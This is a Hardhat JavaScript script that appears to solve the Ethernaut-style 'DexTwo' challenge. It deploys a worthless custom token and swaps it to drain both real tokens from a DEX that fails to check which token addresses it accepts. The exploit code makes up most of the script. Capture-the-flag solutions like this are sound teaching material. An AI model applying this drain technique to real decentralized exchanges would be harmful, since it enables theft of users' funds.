const { ethers } = require("hardhat");

async function main() {
  let dexAddress = "0xe73bc5BD4763A3307AB5F8F126634b7E12E3dA9b";
  const myAddress = "0x90F79bf6EB2c4f870365E785982E1f101E93b906";
  // Setup phase
  let dexTwo = null;
  // If we have a DEX address, we attach to it
  if (dexAddress) {
    const DexTwo = await ethers.getContractFactory("DexTwo");
    dexTwo = await DexTwo.attach(dexAddress);

    console.log(
      `DexTwo attached to ${dexTwo.address} with owner ${await dexTwo.owner()}`
    );
  } else {
    // If we don't have a DEX address, we deploy it
    const DexTwo = await ethers.getContractFactory("DexTwo");
    dexTwo = await DexTwo.deploy();
    await dexTwo.deployed();
    dexAddress = dexTwo.address;
    console.log(
      `Dex deployed to ${dexAddress} with owner ${await dexTwo.owner()}`
    );

    const SwappableTokenTwo = await ethers.getContractFactory(
      "SwappableTokenTwo"
    );
    const swappableTokenTwo1 = await SwappableTokenTwo.deploy(
      dexTwo.address,
      "Swappable Token 1",
      "STT1",
      110
    );
    await swappableTokenTwo1.deployed();
    const swappableTokenTwo2 = await SwappableTokenTwo.deploy(
      dexTwo.address,
      "Swappable Token Two 2",
      "STT2",
      110
    );
    await swappableTokenTwo2.deployed();
    console.log(`swappableToken1 deployed to ${swappableTokenTwo1.address}`);
    console.log(`swappableToken2 deployed to ${swappableTokenTwo2.address}`);

    await dexTwo.setTokens(
      swappableTokenTwo1.address,
      swappableTokenTwo2.address
    );

    await dexTwo.approve(dexTwo.address, 100);
    await dexTwo.add_liquidity(swappableTokenTwo1.address, 100);
    await dexTwo.add_liquidity(swappableTokenTwo2.address, 100);

    console.log(
      "Added 100 tokens from each swappable token to the dex from the owner"
    );

    await dexTwo.approve(await dexTwo.owner(), 10);
    await swappableTokenTwo1.transferFrom(await dexTwo.owner(), myAddress, 10);
    await swappableTokenTwo2.transferFrom(await dexTwo.owner(), myAddress, 10);

    console.log(
      "Transferred 10 tokens from each swappable token to my address"
    );
  }

  // Start of the hack
  const mySigner = await ethers.getSigner(myAddress);
  const token1Address = await dexTwo.token1();
  const token2Address = await dexTwo.token2();

  // Creating my own token
  const SwappableTokenTwo = await ethers.getContractFactory(
    "SwappableTokenTwo"
  );
  const swappableTokenTwo3 = await SwappableTokenTwo.connect(mySigner).deploy(
    dexAddress,
    "Swappable Token Two 3",
    "STT3",
    1000001
  );
  await swappableTokenTwo3.deployed();

  const token3Address = swappableTokenTwo3.address;
  console.log("Created my own token at", token3Address);
  console.log(await swappableTokenTwo3.connect(mySigner).balanceOf(myAddress));
  // await swappableTokenTwo3.connect(mySigner).approve(myAddress, myAddress, 1);
  await swappableTokenTwo3
    .connect(mySigner)
    ["approve(address,address,uint256)"](myAddress, myAddress, 1);
  await swappableTokenTwo3
    .connect(mySigner)
    .transferFrom(myAddress, dexAddress, 1);

  console.log("Sent 1 token to the dex");

  await swappableTokenTwo3
    .connect(mySigner)
    ["approve(address,address,uint256)"](myAddress, dexAddress, 1000000);
  console.log("Approved dex to spend all my tokens");

  let amountToSwap = await dexTwo.balanceOf(token3Address, dexAddress);
  await dexTwo
    .connect(mySigner)
    .swap(token3Address, token1Address, amountToSwap);

  amountToSwap = await dexTwo.balanceOf(token3Address, dexAddress);
  await dexTwo
    .connect(mySigner)
    .swap(token3Address, token2Address, amountToSwap);

  console.log(
    `DEX: ${await dexTwo.balanceOf(
      token1Address,
      dexAddress
    )},${await dexTwo.balanceOf(token2Address, dexAddress)}`
  );
  console.log(
    `ME: ${await dexTwo.balanceOf(
      token1Address,
      myAddress
    )},${await dexTwo.balanceOf(token2Address, myAddress)}`
  );

  console.log("Done");
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
